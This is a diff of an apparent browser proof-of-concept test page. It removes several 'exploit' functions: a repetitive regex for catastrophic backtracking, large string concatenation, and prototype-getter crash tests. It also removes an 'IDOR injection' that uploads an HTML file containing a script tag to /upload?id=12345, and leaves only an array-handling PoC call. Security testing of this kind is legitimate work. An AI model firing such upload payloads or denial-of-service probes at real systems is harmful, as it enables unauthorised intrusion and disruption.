@@ -97,42 +97,6 @@
             console.timeEnd("Out-of-bounds access test");
         }
 
-        function exploitLargeStringConcatenation() {
-            console.time("Large string concatenation");
-            let longString = "a".repeat(1e7); // Create a string of 10 million "a" characters
-            let concatenatedString = longString + longString; // Double the string length
-
-            console.log("Concatenated string length:", concatenatedString.length); // Output the length
-            console.timeEnd("Large string concatenation");
-        }
-
-        function exploitComplexRegex() {
-            let regexPattern = /(a|a|a|a|a|a|a|a|a|a){1000}/; // Extremely repetitive pattern
-            let testString = "a".repeat(1000); // Input string to match against regex
-
-            let matchResult = testString.match(regexPattern);
-            console.log("Regex match result:", matchResult);
-        }
-
-        function test1() {
-            let f = new MyFunction();
-            try {
-                f.__defineGetter__("prototype", () => {});
-            } catch (error) {
-                console.error("Caught exception in test1:", error);
-            }
-        }
-
-        function test2(i) {
-            let f = new MyFunction();
-            try {
-                f.__defineGetter__("prototype", () => {});
-            } catch (error) {
-                console.error("Caught exception in test2:", error);
-            }
-            f.prototype.x = i; // Should not crash
-        }
-
         function logStatus(message) {
             const output = document.getElementById("output");
             output.textContent += `${message}\n`;
@@ -159,42 +123,9 @@
             hideContent();
 
             try {
-                // Perform the IDOR injection first
-                log.info("Starting IDOR injection...");
-                await performTest(async () => {
-                    try {
-                        // Create a FormData object for the injection payload
-                        let formData = new FormData();
-                        formData.append("file", new Blob(["<script>alert('IDOR with delayed script injection');</script>"], { type: "text/html" }));
-
-                        // Send the request to the target endpoint after 5 seconds
-                        let response = await fetch("/upload?id=12345", {
-                            method: "POST",
-                            body: formData
-                        });
-                        if (response.ok) {
-                            log.info("IDOR payload successfully sent after delay.");
-                        } else {
-                            log.error("IDOR request failed with status:", response.status);
-                        }
-                    } catch (error) {
-                        log.error("Error during IDOR request:", error);
-                    }
-                });
-
-                // Perform the other PoC tests with a 2-second delay between each
-                let tests = [exploitArrayHandling, exploitLargeStringConcatenation, exploitComplexRegex, test1, test2];
-                let delay = 2000; // 2-second delay between each test
-
-                const testPromises = tests.map(test => performTest(test));
-                const results = await Promise.allSettled(testPromises);
-                results.forEach(result => {
-                    if (result.status === 'fulfilled') {
-                        log.info(`${result.value} completed successfully`);
-                    } else {
-                        log.error(`${result.reason} failed`);
-                    }
-                });
+                // Perform the array handling PoC
+                log.info("Starting array handling PoC...");
+                await performTest(exploitArrayHandling);
             } catch (error) {
                 log.error("Error encountered during PoC execution:", error);
             } finally {
